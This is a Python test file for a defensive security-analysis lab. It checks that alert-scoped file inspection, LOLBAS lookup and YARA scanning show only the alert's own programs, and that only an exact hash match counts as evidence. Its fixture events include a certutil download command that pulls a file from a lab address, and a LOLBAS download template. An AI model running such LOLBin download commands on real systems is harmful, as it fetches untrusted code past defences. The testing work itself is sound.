"""Wave 3 for the night-tools labs: an alert travels into them (?alert=<id>) and they show that alert's own
programs and files (from its report, as the Story tells it). Fixture stores and a stand-in report only."""

import json

from fastapi import FastAPI
from fastapi.testclient import TestClient

from engine import labs
from engine.alerts import Alert, AlertStore
from engine.labs import _files, fileinspect as F, lolbas as L, storydiff as D
from nighttools_fixtures import lab_folder, sha256, store_with, write_pe

G1, G2, G3 = "{AAAA-0001}", "{AAAA-0002}", "{BBBB-0003}"


def setup(tmp_path, monkeypatch):
    lab = lab_folder(tmp_path, monkeypatch)
    fetch = write_pe(str(lab / "s9_fetch.exe"), sections=[(".text", b"fetch" * 40, 0x60000020)])
    other = write_pe(str(lab / "s9_other.exe"), sections=[(".text", b"other" * 40, 0x60000020)])
    db = store_with(str(tmp_path / "events.db"), [
        {"event_id": 1, "time": "2026-11-01T10:00:00.000Z", "data": {"ProcessGuid": G1.lower(), "Image": "D:\\s9\\s9_fetch.exe",
                                                                      "Hashes": "SHA256=" + sha256(fetch).upper()}},
        {"event_id": 1, "time": "2026-11-01T10:00:01.000Z", "data": {"ProcessGuid": G2.lower(), "Image": "C:\\Windows\\System32\\certutil.exe",
                                                                      "CommandLine": "certutil -urlcache -f http://10.0.2.2/x x", "ParentImage": "D:\\s9\\s9_fetch.exe"}},
        {"event_id": 1, "time": "2026-11-01T10:05:00.000Z", "data": {"ProcessGuid": G3.lower(), "Image": "D:\\s9\\s9_other.exe",
                                                                      "Hashes": "SHA256=" + sha256(other)}},
        {"event_id": 1, "time": "2026-11-01T10:05:01.000Z", "data": {"ProcessGuid": "{cccc-0004}", "Image": "C:\\Windows\\System32\\certutil.exe",
                                                                      "CommandLine": "certutil -store my"}},
    ])
    al = tmp_path / "alerts.db"
    s = AlertStore(str(al))
    s.write([Alert(rule_id="r1", title="Fixture alert", source="sigma", level="high", time="2026-11-01T10:00:02.000Z",
                   host="analystlab-vm", reason="r", evidence=("k",))])
    alert_id = s.read()[0].alert_id
    s.close()
    report = {"facts": [
        {"kind": "started", "sentence": "s9_fetch.exe started certutil.exe", "u": f"proc:analystlab-vm:{G1}", "v": f"proc:analystlab-vm:{G2}"},
        {"kind": "created", "sentence": "s9_fetch.exe created x", "u": f"proc:analystlab-vm:{G1}",
         "v": "file:analystlab-vm:c:\\analystlab\\scenarios\\s9\\x|" + "e" * 64}]}
    labs.configure(labs.Context(str(db), str(al), recordings=str(tmp_path / "rec"), report=lambda a: report,
                                hosts=("analystlab-vm",)))
    return alert_id, fetch, other


def client(*routers):
    app = FastAPI()
    for r in routers:
        app.include_router(r)
    return TestClient(app)


def test_alert_scope_names_the_storys_programs_and_files(tmp_path, monkeypatch):
    alert_id, fetch, _ = setup(tmp_path, monkeypatch)
    s = _files.alert_scope(labs.context(), alert_id)
    assert s["alert"]["title"] == "Fixture alert" and s["guids"] == {G1.lower(), G2.lower()}
    assert sha256(fetch) in s["shas"] and "e" * 64 in s["shas"]
    assert "d:\\s9\\s9_fetch.exe" in s["paths"] and "c:\\analystlab\\scenarios\\s9\\x" in s["paths"]


def test_file_inspector_with_an_alert_lists_only_its_own_programs(tmp_path, monkeypatch):
    alert_id, fetch, other = setup(tmp_path, monkeypatch)
    c = client(F.router)
    every = {f["name"] for f in c.get("/api/labs/fileinspect").json()["files"]}
    assert {"s9_fetch.exe", "s9_other.exe"} <= every
    body = c.get(f"/api/labs/fileinspect?alert={alert_id}").json()
    assert body["alert"]["title"] == "Fixture alert"
    by = {f["name"]: f for f in body["files"]}
    assert set(by) == {"s9_fetch.exe", "certutil.exe"}                         # s9_other.exe is not in this story
    assert by["s9_fetch.exe"]["match"] == "sha256" and by["certutil.exe"]["match"] == "none"
    assert c.get("/api/labs/fileinspect?alert=not-here").json() == {"detail": "This alert isn't in this recording."}


def test_lolbas_with_an_alert_shows_only_the_tools_its_story_ran(tmp_path, monkeypatch):
    alert_id, _, _ = setup(tmp_path, monkeypatch)
    p = tmp_path / "lolbas.json"
    p.write_text(json.dumps([{"Name": "Certutil.exe", "Full_Path": [{"Path": "C:\\Windows\\System32\\certutil.exe"}],
                              "Commands": [{"Command": "certutil.exe -urlcache -f {REMOTEURL} {PATH}", "Category": "Download"}]}]),
                 encoding="utf-8")
    monkeypatch.setenv("ANALYSTLAB_LOLBAS_JSON", str(p))
    L._cache.update(key=None, data=None)
    c = client(L.router)
    assert c.get("/api/labs/lolbas").json()["tools"][0]["times"] == 2
    body = c.get(f"/api/labs/lolbas?alert={alert_id}").json()
    assert body["alert"]["title"] == "Fixture alert"
    t = body["tools"][0]
    assert t["times"] == 1 and t["runs"][0]["match"]["category"] == "Download"
    assert c.get("/api/labs/lolbas?alert=not-here").status_code == 404


def test_story_diff_suggests_the_run_the_alert_happened_in():
    rs = [{"id": "r3", "start": "2026-11-01T11:00:00Z", "scenario": "S1"}, {"id": "r2", "start": "2026-11-01T09:55:00Z", "scenario": "S1"},
          {"id": "r1", "start": "2026-10-31T09:00:00Z", "scenario": "S4"}]
    assert D.run_of(rs, "2026-11-01T10:00:02.000Z")["id"] == "r2"
    assert D.run_of(rs, "2026-11-02T10:00:00Z") is None and D.run_of(rs, None) is None


def test_only_an_exact_hash_is_the_evidence_a_rebuild_never_is(tmp_path, monkeypatch):
    """Analyst critique: the recorded payload's SHA-256 differs from the lab's copy (each checkout builds its own
    .exe). Only an exact match is "the file that ran"; a same-name rebuild is labelled and never used as evidence."""
    from engine.labs import yara as Y
    lab = lab_folder(tmp_path, monkeypatch)
    rebuilt = write_pe(str(lab / "s9_payload.exe"), sections=[(".text", b"rebuilt" * 40, 0x60000020)])
    db = store_with(str(tmp_path / "events.db"), [
        {"event_id": 1, "time": "2026-11-01T10:00:00.000Z", "data": {"ProcessGuid": G1.lower(), "Image": "C:\\s9\\s9_payload.exe",
                                                                      "Hashes": "SHA256=" + "5277" + "0" * 60}}])
    al = tmp_path / "alerts.db"
    s = AlertStore(str(al))
    s.write([Alert(rule_id="r1", title="Fixture alert", source="sigma", level="high", time="2026-11-01T10:00:02.000Z",
                   host="analystlab-vm", reason="r", evidence=("k",))])
    alert_id = s.read()[0].alert_id
    s.close()
    report = {"facts": [{"kind": "started", "sentence": "x started s9_payload.exe", "u": f"proc:analystlab-vm:{G2}",
                         "v": f"proc:analystlab-vm:{G1}"}]}
    labs.configure(labs.Context(str(db), str(al), recordings=str(tmp_path / "rec"), report=lambda a: report, hosts=("analystlab-vm",)))
    c = client(F.router, Y.router)
    body = c.get(f"/api/labs/fileinspect?alert={alert_id}").json()
    assert body["evidence_here"] is False and body["words"]["no_evidence"].startswith("The exact file that ran isn't on this laptop")
    item = body["files"][0]
    assert item["match"] == "name" and item["evidence"] is False
    info = c.get(f"/api/labs/fileinspect/inspect/{item['id']}").json()["info"]
    assert info["evidence"] is False and info["lookalike"] is True and info["sha256"] == sha256(rebuilt)
    # YARA: "every file of the recording" scans the evidence only; a single scan of the rebuild says what it is
    monkeypatch.setattr(Y, "loaded", lambda ctx=None, eng=None, which=None: (object(), object(), {"rules": 1}))
    monkeypatch.setattr(Y, "scan_path", lambda eng, rules, path: {"matches": [], "truncated": False, "seconds": 0})
    assert c.get("/api/labs/yara/scan-all").json()["scanned"] == 0
    one = c.get(f"/api/labs/yara/scan/{item['id']}").json()
    assert one["rebuild"].startswith("A rebuild of the same test program") and one["file"]["evidence"] is False


def test_an_exact_match_is_the_evidence(tmp_path, monkeypatch):
    alert_id, fetch, _ = setup(tmp_path, monkeypatch)
    body = client(F.router).get(f"/api/labs/fileinspect?alert={alert_id}").json()
    assert body["evidence_here"] is True
    f = next(x for x in body["files"] if x["name"] == "s9_fetch.exe")
    assert f["evidence"] is True
    info = client(F.router).get(f"/api/labs/fileinspect/inspect/{f['id']}").json()["info"]
    assert info["evidence"] is True and not info.get("lookalike") and info["sha256"] == sha256(fetch)

